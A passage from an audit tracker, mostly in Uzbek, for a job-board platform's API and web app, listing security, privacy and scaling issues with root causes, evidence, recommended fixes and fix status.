- **Manba topilmalar:** employer-flows-3
- **Bajarilgan fix:** employer-flows-3: FIXED — Holat, vakansiya, qidiruv, hudud, davr, saralash va sonlar endi serverda; web URL holati bilan server so'rovlariga o'tdi.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-058

**/api/employer/vacancies jimgina 1000 ta to'liq hujjat bilan cheklangan, har qatorda _count; tahrirlash sahifasi butun ro'yxatni yuklaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-058
- **Area:** scale/employer-vacancies
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:126`
- **Root cause:** Endpoint 1000 tagacha to'liq hujjat (description 20k, requirements/conditions 10k belgigacha) qaytaradi, har qatorda _count.applications, javobda total yo'q. Egasi uchun bitta vakansiya GET'i yo'q, shu sababli tahrir formasi butun ro'yxatni yuklab brauzerda qidiradi.
- **Impact:** Faol vakansiya limiti yo'q, arxivlanganlar to'planadi. 1000 dan keyin eng eskilari dashboard va statistikadan jimgina tushadi, ularning tahrir sahifasi 'topilmadi' deydi. Har dashboard yoki tahrir ochilishi bir necha MB yuklaydi. applications.routes.ts'da o'lchab almashtirilgan per-row _count naqshi shu yerda qolgan.
- **Evidence:** vacancies.routes.ts:93 `EMPLOYER_VACANCIES_LIMIT = 1000`; :126-137 include `_count: { select: { applications: true } }` va take, faqat `{ items }` qaytadi; VacancyFormView.tsx:79 fetchEmployerVacancyRecords, :88 topilmasa `not_found`; applications.routes.ts:223-226 groupBy bilan almashtirilgan.
- **Recommended fix:** ownedVacancy'dan foydalanuvchi GET /api/employer/vacancies/:id qo'shing. Ro'yxatga karta select, server sahifalash, status filtri va total bering. Ariza sonlarini application.groupBy (vacancyId) bilan oling.
- **Severity izohi:** P2 saqlandi. ISSUE-058 PARTIAL: indeks va 1000 chegara bor, tahrir sahifasi hali butun ro'yxatni yuklaydi.
- **Manba topilmalar:** employer-flows-4
- **Bajarilgan fix:** employer-flows-4: FIXED — No 1000-document cap any more: page/pageSize/status/text/region/category/sort are server-side, with counts per status and the filter options returned alongside.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-032

**Ochiq kompaniya sharhlari muallifning to'liq ismi va userId'sini beradi, bu esa u shu kompaniyaga ariza berganini oshkor qiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-032
- **Area:** privacy/reviews
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:201`
- **Root cause:** Sharh yozish uchun oldin shu kompaniyaga ariza berish shart. Ochiq GET /api/companies/:slug esa har sharhning userId'si va muallifning ism-familiyasini qaytaradi, UI to'liq ismni ko'rsatadi. D-017 userId'ni 'mening sharhim' uchun qoldirgan.
- **Impact:** Har kim, jumladan ish beruvchining o'zi, nomlangan nomzod shu kompaniyaga ariza berganini biladi. Ish beruvchi muallifni arizalari bilan solishtirib, qasos olishi mumkin. Barqaror userId shu odamni boshqa kompaniyalarda ham bog'laydi, anonim variant yo'q.
- **Evidence:** companies.routes.ts:201 `userId: true`, :202 `user: { select: { jobSeekerProfile: { select: { firstName: true, lastName: true } } } }`; reviews.routes.ts:27-37 hasApplied gate; CompanyReviews.tsx:176 `name = review.authorName`; DECISIONS.md D-017 'Sharh muallifining foydalanuvchi ID'si ochiq qoladi'.
- **Recommended fix:** 'Mine'ni userId qaytarish o'rniga serverda ixtiyoriy auth (yoki alohida mine endpoint) bilan hisoblang. Muallifni sukut bo'yicha ism va familiya bosh harfi (yoki 'Nomzod') ko'rinishida chiqaring, to'liq ism faqat roziligi bilan.
- **Severity izohi:** P2. ISSUE-032 manbalarida (R081/R183) sharh userId'si bor edi, D-017 uni qoldirgan. To'liq ism orqali ariza fakti oshkor bo'lishi yangi jihat.
- **Manba topilmalar:** employer-flows-8
- **Bajarilgan fix:** employer-flows-8: FIXED — userId is gone from the public reviews payload; `mine: boolean` is computed server-side from an optional access token. Additionally the author's last name is returned as an initial
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-046

**Suhbatlar ro'yxati chegarasiz va har yuklashda butun xabar tarixi bo'yicha aggregatsiya qiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-046
- **Area:** scale/messages
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:358`
- **Root cause:** GET /api/conversations'da take va cursor yo'q. Barcha suhbatlar kompaniya description bilan yuklanadi, oxirgi xabar esa barcha suhbatlarning barcha xabarlari ustidagi $match $in/$sort/$group bilan topiladi. So'ng kompaniyalarning barcha vakansiya ID'lari va nomzodlarning barcha arizalari o'qiladi.
- **Impact:** Minglab suhbati va ~100k xabari bor faol ish beruvchi /messages'ni har ochganda yoki qayta ulanganda to'liq tarixni skanerlaydi. Platforma yoshi bilan javob hajmi va kechikish o'sadi.
- **Evidence:** chat.routes.ts:358-381 `prisma.conversation.findMany({ where: { OR: [...] }, include: { company: { select: { ... description: true } } } })` take'siz; :122-139 lastMessages aggregateRaw barcha id'lar bo'yicha; :396-433 limitsiz vakansiya/ariza findMany; :500 xotirada saralash.
- **Recommended fix:** Conversation'da lastMessageAt va preview saqlang (deliverMessage'da yangilanadi). [employerUserId, lastMessageAt] va [seekerUserId, lastMessageAt] indekslarini qo'shing, cursor sahifalash qiling, vakansiya kontekstini faqat qaytgan sahifa uchun hisoblang va ro'yxatdan company.description'ni olib tashlang.
- **Severity izohi:** P2 saqlandi. ISSUE-046 PARTIAL: aggregatsiya yaxshilangan (p95 ~1.1 s), cursor sahifalash qilinmagan.
- **Manba topilmalar:** employer-flows-9
- **Bajarilgan fix:** employer-flows-9: PARTIAL — Same as db-perf-7: the employer list is bounded to one page and the per-conversation aggregation is limited to the page; the global last-message aggregation over the employer's con
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-041

**Refresh tokenlar stateless va rotatsiya qilinmaydi: o'g'irlangan cookie global logout'gacha ishlayveradi va o'zini yangilaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Mavjud tracker:** ISSUE-041
- **Area:** auth/session
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:145`
- **Root cause:** refreshSession imzo va tokenVersion'ni tekshirib, xuddi shu versiya bilan yangi token imzolaydi. Eski tokenlar 30 kunlik muddatigacha yaroqli. jti, sessiya ombori va qayta ishlatishni aniqlash yo'q. Yagona bekor qilish tokenVersion++, u barcha qurilmalarni chiqaradi.
- **Impact:** Nusxalangan cookie (qurilma backup'i, zararli dastur, proxy log) haqiqiysi bilan birga cheksiz ishlaydi, aniqlanmaydi va 'faol sessiyalar' ro'yxati yo'q. J qoidasi ('refresh tokenlarni bekor qilish') faqat global versiya oshirish orqali bajariladi.
- **Evidence:** auth.service.ts:131-146; jwt.ts:41-46 (30d, jti yo'q); auth.routes.ts:84-86 har refresh'da cookie qayta o'rnatiladi; D-009 jti jadvalini kelajakka qoldirgan.
- **Recommended fix:** RefreshSession {jti, userId, familyId, tokenHash, expiresAt TTL, revokedAt, lastUsedAt, userAgent} modeli: har refresh'da rotatsiya, aylantirilgan token qayta ishlatilsa butun family bekor qilinadi. Global bekor qilish uchun tokenVersion saqlansin. Bir nechta tab parallel refresh qilishi uchun qisqa grace oynasi qo'ying.
- **Severity izohi:** P2 saqlandi. ISSUE-041 FIXED faqat global bekor qilish bilan; root cause'dagi stateless/jti yo'qligi hali bor (D-009).
- **Manba topilmalar:** auth-core-11
- **Bajarilgan fix:** auth-core-11: WONT FIX — D-079: refresh-token rotation is deliberately not implemented; revocation stays tokenVersion-based (now also closing sockets). Open risk documented in the decision.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-078

**Web origin'da CSP yo'q, access token localStorage'da; API CSP esa HTML bermasa ham 'unsafe-inline' ga ruxsat beradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-078
- **Area:** security/csp
- **Fayl:** `apps/web/vercel.json:20`
- **Root cause:** Web yetkazishning barcha yo'llari (vercel.json, api/ssr.js, server/index.mjs, vite.config.ts) faqat nosniff, XFO, COOP, Referrer-Policy (+Vercel'da HSTS) beradi, CSP yo'q. setAccessToken tokenni localStorage'ga yozadi. API helmet CSP scriptSrc 'unsafe-inline' ni saqlaydi, garchi API HTML bermasa ham.
- **Impact:** Hozir ekspluatatsiya qilinadigan XSS topilmadi (JsonLd escape qilingan, markdown/chat href allowlist). Lekin kelajakdagi har qanday injection (vakansiya, kompaniya, maqola, chat) tokenni o'qiydi yoki credentials bilan /api/auth/refresh ni chaqiradi, jumladan bir xil origin'dagi /admin da. Rejalashtirilgan parol reset sahifasi ham himoyasiz origin'da bo'ladi.
- **Evidence:** vercel.json:20-33 (CSP kaliti yo'q); api/ssr.js:15-20; server/index.mjs:40-45; session.ts:99 `window.localStorage.setItem(STORAGE_KEY, token)`; apps/api/src/server.ts:88 `scriptSrc: ["'self'", "'unsafe-inline'", ...]`.
- **Recommended fix:** Barcha target'lar ishlatadigan bitta umumiy header moduli. Avval Report-Only, keyin enforce: default-src 'self'; script-src 'self' 'sha256-<theme>' https://accounts.google.com/gsi/client; connect-src 'self' <API> wss://<API host> https://accounts.google.com/gsi/; frame-src https://accounts.google.com; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'self'. API uchun default-src 'none'; frame-ancestors 'none'. Cookie first-party bo'lgach, tokenni faqat xotirada saqlang.
- **Severity izohi:** P2 (auth-core-13 va files-xss-5 P3 bergan): defense-in-depth, hozir faol XSS yo'q. ISSUE-078 NOT FIXED (D-031); token saqlash qismi ISSUE-083 (NOT FIXED).
- **Manba topilmalar:** auth-core-13, files-xss-4, files-xss-5, headers-infra-7
- **Bajarilgan fix:** files-xss-4: FIXED — The web origin now sends a per-request nonce CSP on every HTML response through the single +headersResponse source (all three serving paths copy it). Enforced, not Report-Only, per | files-xss-5: FIXED — API CSP is default-src 'none'; object-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none' - no script-src and no 'unsafe-inline' on the origin holding the refre | headers-infra-7: FIXED — Same CSP; verified there is exactly one inline script (the theme init, which gets the nonce), that JSON-LD <script type="application/ld+json"> blocks are data blocks unaffected by 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-029

**Nomzod PDF rezyumelari /uploads/ da avtorizatsiyasiz: URL doimiy bearer havola, public cache, logga yoziladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-029
- **Area:** privacy/uploads
- **Fayl:** `apps/api/src/server.ts:174`
- **Root cause:** fastifyStatic butun UPLOAD_DIR ni /uploads/ ostida hech qanday tekshiruvsiz beradi, jumladan resume-<32hex>.pdf. Himoya faqat URL maxfiyligi. @fastify/send sukut 'Cache-Control: public', CORP cross-origin, PDF'ga sandbox yoki Content-Disposition yo'q. Req serializer to'liq URL'ni loglaydi, redactUrl esa faqat token parametrlarini kesadi.
- **Impact:** URL'ni bir marta olgan har kim (log ko'ruvchi, umumiy kesh/proxy, forward qilingan havola, ariza rad etilgandan keyin employer yoki admin) nomzod rezyumesini (telefon, manzil, ish tarixi) nomzod almashtirmaguncha cheksiz yuklab oladi. Kim yuklagani haqida iz yo'q.
- **Evidence:** server.ts:174 `register(fastifyStatic, { root: UPLOAD_DIR, prefix: "/uploads/" })`; :54-58 redactUrl; :168 PDF sandbox'siz; profile.routes.ts:109; applications.routes.ts:294 resumeUrl vakansiya egasiga; e2e-check.mjs:1602 PDF auth'siz 200; D-013 Risk.
- **Recommended fix:** Rezyumelarni static root'dan chiqaring. GET /api/profile/resume/file (egasi) va GET /api/applications/:id/resume-file (shu ariza vakansiyasining egasi, egalik tekshiruvi bilan) orqali Cache-Control: private, no-store, Content-Disposition: attachment, CORP same-site bilan stream qiling. Employer'ga xom resumeUrl qaytarmang, web blob URL orqali olsin. Vaqtincha /uploads/resume-* ni log redaction'ga qo'shing va .pdf uchun no-store qo'ying.
- **Severity izohi:** P2 saqlandi: nom taxmin qilinmaydi (32 hex). ISSUE-029 PARTIAL (D-013): tasodifiy nom va o'chirish tuzatilgan, avtorizatsiya yo'q.
- **Manba topilmalar:** authz-idor-8, files-xss-1
- **Bajarilgan fix:** authz-idor-8: FIXED — Authorization is enforced server-side per request (owner, vacancy company owner, admin); files stay on disk where they are, only the access path changed, so existing data keeps wor | files-xss-1: FIXED — Resume PDFs are no longer reachable through the static route (404) and are served only by the authenticated /api/resume-files/* routes with private, no-store, nosniff and noindex; 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-028

**prestart har boot'da prisma db push bajaradi: telefon/Telegram yagonaligi uchun kerakli unique indekslar API'ni crash-loop'ga tushiradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-028
- **Area:** deploy/schema
- **Fayl:** `apps/api/package.json:14`
- **Root cause:** npm start node'dan oldin prestart `prisma db push --skip-generate` ni ishlatadi, alohida release bosqichi yo'q. E/F qoidalari yagona telefon va Telegram identifikatorini talab qiladi, lekin hozir User.phone unique emas va bot uni dublikat tekshiruvisiz yozadi. Sxema izohiga ko'ra Mongo unique indeksi barcha null'larni teng deb biladi.
- **Impact:** phone yoki telegramChatId ga @unique qo'shilgach, mavjud dublikat yoki bir nechta null'da db push yiqiladi, npm start chiqib ketadi, Railway 10 marta qayta urinadi va yagona nusxa ishlamay qoladi. Yuzlab ming qatorli kolleksiyalarda indeks qurish listen'dan oldin, 120s healthcheck ichida bajariladi. Har qanday sxema o'zgarishi review'siz production'ga tushadi.
- **Evidence:** package.json:14 `"prestart": "prisma db push --skip-generate"`; railway.json:8-13 (healthcheckTimeout 120, ON_FAILURE ×10, numReplicas 1); schema.prisma:163, 172-176; telegram.service.ts:339-343; D-029.
- **Recommended fix:** prestart'ni olib tashlab db push'ni gated release bosqichiga (Railway preDeployCommand yoki qo'lda) o'tkazing. Avval dublikat telefonlar uchun tozalash skripti. Yagonalikni null to'qnashmaydigan alohida binding kolleksiyasi (PhoneBinding {phoneE164 @unique, userId}) orqali ta'minlang. Deploy checklist'ga qo'shing.
- **Severity izohi:** headers-infra P1 bergan -> P2: hozirgi kod yiqilmaydi, xavf yagonalik migratsiyasi paytida yuzaga chiqadi. ISSUE-028 WONT FIX (D-029), lekin yangi E/F qoidalari uni qayta dolzarb qiladi.
- **Manba topilmalar:** headers-infra-6
- **Bajarilgan fix:** headers-infra-6: FIXED — prestart removed; schema changes are applied by the explicit `npm run db:sync` release step, so a new index can no longer crash-loop the API on boot.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-030

**Maxfiy URL'lar logga tushadi: self-hosted web server xom invite token'ni loglaydi, API redaction esa faqat qat'iy parametr nomlarini biladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-030
- **Area:** logging/secrets
- **Fayl:** `apps/web/server/index.mjs:51`
- **Root cause:** Self-hosted web server info darajasida Fastify'ning sukut req serializer'ini ishlatadi, u to'liq req.url ni loglaydi. Staff taklif sahifasi sirni /admin/invite?token=... da olib yuradi. API faqat token va access_token nomli query parametrlarini va /api/staff-invites/ yo'lini redact qiladi.
- **Impact:** Staff taklif tokenlari self-hosted web loglariga allaqachon tushadi. B/D qoidalaridagi recovery qaytish havolasi va Telegram tasdiq URL'lari aynan shu nomlarni ishlatmasa ochiq matnda loglanadi, bu L qoidasini buzadi. Vercel request loglari ham query string'ni saqlashi ehtimol (taxmin).
- **Evidence:** server/index.mjs:50-51 `logger: { level: process.env.LOG_LEVEL ?? "info" }` serializer/redact'siz; pages/admin/invite/+Page.tsx:4 `/admin/invite?token=…`; apps/api/src/server.ts:54-58 redactUrl regex.
- **Recommended fix:** Ikkala logger'da sukut bo'yicha butun query string'ni kesing, xavfsiz parametrlar allowlist'i bilan. Recovery tokenlarini query o'rniga URL fragment yoki POST body'da uzating. Loglarda token qidiruvchi e2e testini qo'shing.
- **Severity izohi:** P2 saqlandi. ISSUE-030 FIXED faqat API tomonida; web server va kelajakdagi recovery URL'lari qolgan.
- **Manba topilmalar:** headers-infra-12
- **Bajarilgan fix:** headers-infra-12: FIXED — Web part (my scope): the self-hosted Fastify logger has a custom req serializer that redacts the values of token, reset, code, access_token and requestCode, so /admin/invite?token=
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-062

**Production himoyasi faqat NODE_ENV ga bog'liq (sukut development): qiymat berilmasa prod ochiq namunaviy JWT sirlari bilan ishga tushadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-062
- **Area:** env-validation
- **Fayl:** `apps/api/src/common/env.ts:28`
- **Root cause:** NODE_ENV sukuti 'development' va sir uzunligi, farqlilik va placeholder tekshiruvlari production bo'lmasa qaytib ketadi. Asosiy minimum 8 belgi, .env.example placeholder'lari undan o'tadi va .env.example NODE_ENV=development ni o'zi beradi. Xuddi shu bayroq cookie Secure/SameSite, localhost CORS, HSTS va CSP unsafe-eval'ni boshqaradi. WEB_ORIGIN sukuti localhost va tekshirilmaydi.
- **Impact:** NODE_ENV o'rnatilmasa yoki .env.example nusxalansa, API ochiq ma'lum HS256 sirlari bilan ishlaydi va istalgan kishi istalgan user id uchun token yasay oladi. Telegram, email va kelajakdagi recovery havolalari localhost'ga ishora qiladi. Nixpacks odatda NODE_ENV=production qo'yadi, boshqa builder'lar qo'ymasligi mumkin (taxmin).
- **Evidence:** env.ts:28 `.default("development")`; :41-42 min(8); :138 `if (cfg.NODE_ENV !== "production") return;`; :47 WEB_ORIGIN localhost; .env.example:20-21 placeholder sirlar, :26 NODE_ENV=development.
- **Recommended fix:** Placeholder sirlarni va 32 belgidan qisqa sirlarni NODE_ENV'dan qat'i nazar rad eting. RAILWAY_ENVIRONMENT yoki VERCEL o'rnatilgan bo'lsa, aniq NODE_ENV=production va https WEB_ORIGIN'ni talab qiling. WEB_ORIGIN va CORS_EXTRA_ORIGINS sof origin ekanini tekshiring.
- **Severity izohi:** P2 saqlandi, ishonch o'rtacha. ISSUE-062 PARTIAL; ISSUE-119 placeholder tekshiruvini faqat production uchun qo'shgan.
- **Manba topilmalar:** headers-infra-13
- **Bajarilgan fix:** headers-infra-13: PARTIAL — A startup warning now fires when NODE_ENV is development while the environment looks like production (public https WEB_ORIGIN, RAILWAY_ENVIRONMENT or VERCEL). Rejecting short/place
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-059

**Admin vakansiya moderatsiyasi qoralamani e'lon qila oladi va kategoriya/ish joyi/joylashuv qoidalarini tekshirmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-059
- **Area:** admin-staff/moderation
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:301`
- **Root cause:** PATCH /api/admin/vacancies/:id/moderate istalgan holatdan status 'active' qo'yadi: assertVacancyPlacement chaqirilmaydi, draft rad etilmaydi, egasi bloklanganmi tekshirilmaydi. Status route'ida bu tekshiruvlar bor. Admin ro'yxati filtrsiz qoralamalarni ham ko'rsatadi va UI har bir faol bo'lmagan qatorda 'Tasdiqlash' tugmasini chiqaradi.
- **Impact:** Ish beruvchining tugallanmagan shaxsiy qoralamasi uning roziligisiz ochiq bo'lishi mumkin (draft ko'rinish qoidasi). category/workplaceType/location yo'q eski vakansiyalar faollashadi (majburiy maydon qoidalari). Egasi bloklanganda arxivlangan vakansiyalar qayta faollashtirilishi mumkin.
- **Evidence:** admin.routes.ts:289 status enum, :301-309 `...(status ? { status } : {})` tekshiruvsiz; :239-244 ro'yxatda draft; vacancies.routes.ts:245-255 assertVacancyPlacement faqat status route'da; web admin/vacancies/+Page.tsx:175-178 `row.status !== "active"` da Approve.
- **Recommended fix:** moderate'da 'active' ga faqat moderation, rejected yoki archived'dan ruxsat bering, draft uchun 409. effectiveWorkplaceType bilan assertVacancyPlacement'ni chaqiring. Kompaniya egasi isBlocked bo'lsa rad eting. Draft qatorlarida Approve'ni yashiring va draft label'ini tarjima qiling.
- **Severity izohi:** P2 saqlandi: mahsulot qoidalariga zid, lekin ishonchli admin harakatini talab qiladi. ISSUE-059 FIXED faqat /api/vacancies/:id/status da; admin yo'lida xuddi shu root cause qolgan.
- **Manba topilmalar:** admin-staff-6
- **Bajarilgan fix:** admin-staff-6: FIXED — Moderation now runs assertVacancyPlacement with effectiveWorkplaceType and refuses drafts; the admin UI also hides the approve button for drafts.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-053

**Bildirishnomalar retention/TTL'siz o'sadi; eng yangi 100 tadan eskisiga cursor yo'q; unreadOnly uchun compound indeks yo'q**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-053
- **Area:** scale/notifications
- **Fayl:** `apps/api/src/modules/notifications/notifications.routes.ts:20`
- **Root cause:** Ro'yxat faqat unreadOnly va limit<=100 qabul qiladi, before/offset yo'q. notify() har in-app bildirishnoma uchun bitta hujjat, broadcast har foydalanuvchiga bittadan yozadi. deleteMany, TTL indeks yoki tozalash job'i yo'q. unreadOnly isRead bo'yicha filtrlab createdAt bo'yicha sort qiladi, indekslar esa [userId,isRead] va [userId,createdAt].
- **Impact:** Foydalanuvchi eng yangi 100 tadan eskisini ko'ra olmaydi. Kolleksiya har broadcast'da ~10k hujjatga cheksiz o'sadi — saqlash, indeks va backup narxi oshadi. Per-user so'rovlar tez qoladi (6 ms o'lchangan).
- **Evidence:** notifications.routes.ts:20-23 limit max 100; :58-63 take limit ?? 30. notifications.service.ts:100-108 har notify create. admin.routes.ts:574 har user notify. web lib/notifications/api.ts:5 NOTIFICATIONS_LIMIT = 100. schema.prisma:614-630 TTL yo'q, :626,:628 indekslar.
- **Recommended fix:** [userId, createdAt] bo'yicha keyset ?before= parametri. Retention: mavjud scheduler'da kunlik batched deleteMany (masalan o'qilgan 90 kundan, hammasi 180 kundan eski) yoki $runCommandRaw bilan partialFilterExpression {is_read:true} TTL indeksi. @@index([userId, isRead, createdAt]).
- **Severity izohi:** P3 saqlandi: so'rovlar indeksli, muammo o'sish va ko'rinmaydigan tarix. ISSUE-053 root cause'ida 'eski bildirishnomalar o'chirilmaydi' bor, fix faqat indeks qo'shgan.
- **Manba topilmalar:** db-perf-11, realtime-19, scale-10k-15
- **Bajarilgan fix:** db-perf-11: PARTIAL — Pagination beyond the newest 100 is implemented (cursor), so nothing is unreachable any more. Retention/TTL deliberately not implemented (lead: deleting notifications is an owner d | realtime-19: WONT FIX — Lead note: notification retention is an owner decision; cursor pagination makes old rows reachable instead of deleting them. Broadcast still writes one row per user. | scale-10k-15: PARTIAL — Cursor pagination done. Retention: WONT FIX by lead decision. @@index([userId, isRead, createdAt]) for the unreadOnly variant needs prisma/schema.prisma — reported in needsOutside.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-055

**Takroriy yoki keraksiz count so'rovlari (arizalar, kompaniya sahifasi, maosh sort, alerts sweep)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-055
- **Area:** db-perf/query-efficiency
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:221`
- **Root cause:** Jami qiymatlar ularni allaqachon o'z ichiga olgan ma'lumotdan alohida hisoblanadi: employer ro'yxati count + bir xil where bilan groupBy; kompaniya sahifasi _count.reviews + companyReview.aggregate _count; maosh sort pricedCount + total count; alerts sweep faqat items kerak bo'lsa ham doim count qiladigan listVacancies'ni chaqiradi.
- **Impact:** Issiq yo'llarda ortiqcha kolleksiya yoki indeks skanlari; alerts sweep har interval va har obuna uchun bitta keraksiz count bajaradi.
- **Evidence:** applications.routes.ts:221 count({where}), :225 groupBy({where}). vacancies.service.ts:318 pricedCount, :411 count. alerts.service.ts:195 `const { items } = await listVacancies(query)`; vacancies.service.ts:401-412 doim count. companies.routes.ts _count.reviews va aggregate _count (raw evidence :211-225).
- **Recommended fix:** Total'ni groupBy yig'indisidan oling. _count.reviews'ni olib tashlab summary.count ishlating. listVacancies'ga alerts uchun withTotal:false opsiyasi. pricedCount + unpriced count'ni qayta ishlating yoki filtr bo'yicha total'ni keshlang.
- **Severity izohi:** P3 saqlandi. ISSUE-055 FIXED deb belgilangan, root cause'ida 'har obuna uchun keraksiz count' bor, u hali qolgan; boshqa joylar yangi qism.
- **Manba topilmalar:** db-perf-13
- **Bajarilgan fix:** db-perf-13: PARTIAL — Arizalar qismi: alohida count() so'rovi olib tashlandi — jami va holat sonlari bitta groupBy dan. companies.routes.ts (_count.reviews), vacancies.service.ts (pricedCount/count) va 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-056

**Sitemap'lar origin'da keshsiz bitta faylda quriladi (7.2 MB vakansiya sitemap'i); employer sitemap relation filter bilan; 50k qat'iy chegara**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-056
- **Area:** scale/seo
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:97`
- **Root cause:** sitemap-vacancy.xml har so'rovda 50 000 tagacha faol vakansiyani o'qib har URL uchun 3 til + x-default bilan bitta XML satr quradi; API'da Cache-Control yo'q, faqat Vercel proxy 1 soat keshlaydi, self-hosted'da sitemap route yo'q. sitemap-employer owner.isBlocked va vacancies.some relation filtrlari bilan har kompaniya uchun $lookup qiladi.
- **Impact:** ~14k faol vakansiyada har crawler hit 240 ms va 7189 KB; 50k chegarada ~25 MB (chiziqli baho), undan ortig'i jimgina tushib qoladi. Employer sitemap o'lchanmagan, shakli keshsiz katalogga o'xshaydi (inference).
- **Evidence:** seo.routes.ts:97-109 findMany status active take 50000 → buildUrlSet; :111-131 NOT owner.isBlocked, OR vacancies.some; Cache-Control header yo'q (faqat Content-Type). web api/seo.js s-maxage=3600 (Vercel). FINAL_AUDIT sitemap qatori 7189 KB.
- **Recommended fix:** _id keyset bo'yicha 10k talik sitemap-vacancy-N.xml bo'laklari sitemap index'da. Tayyor XML'ni jarayon ichida 1 soat keshlang va API'dan Cache-Control yuboring. Employer sitemap uchun bloklangan owner ID'lar va faol vakansiyali distinct companyId'larni oldindan aniqlang. vercel.json rewrites va robots.txt yangi nomlarni qamrasin.
- **Severity izohi:** Tracker P2 edi; P3: Vercel edge 1 soat keshlaydi va faol soni hali 50k'dan past. Self-hosted farqi ISSUE-100.
- **Manba topilmalar:** db-perf-14, scale-10k-16
- **Bajarilgan fix:** db-perf-14: PARTIAL — Caching, Cache-Control and the removal of relation-filter lookups are done; 5-10k chunking is not (see seo-9). | scale-10k-16: PARTIAL — Origin cost per request removed (1 h in-process cache + Cache-Control) and the employer sitemap no longer uses relation filters; the 7.2 MB single file and the 50k cap remain, now 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-048

**Ochiq vakansiya kartalari to'liq requirements matnini tashiydi; kompaniya sahifasi 200 sharh va 100 kartani qaytaradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** NOT FIXED
- **Mavjud tracker:** ISSUE-048
- **Area:** scale/response-size
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:75`
- **Root cause:** VACANCY_CARD_SELECT requirements'ni (10 000 belgigacha) faqat web client'da ko'nikma belgilarini ajratishi uchun o'z ichiga oladi. Kompaniya detail'i bitta javobda 200 sharh (reviewer userId bilan) va 100 kartani qaytaradi.
- **Impact:** Ro'yxat, similar, home va kompaniya sahifasi javoblari employer yozgan requirements hajmi bilan o'sadi: eng yomon holatda 50 kartali sahifa ~500 KB, kompaniya sahifasi ~1 MB; sintetik ma'lumotda 113 KB.
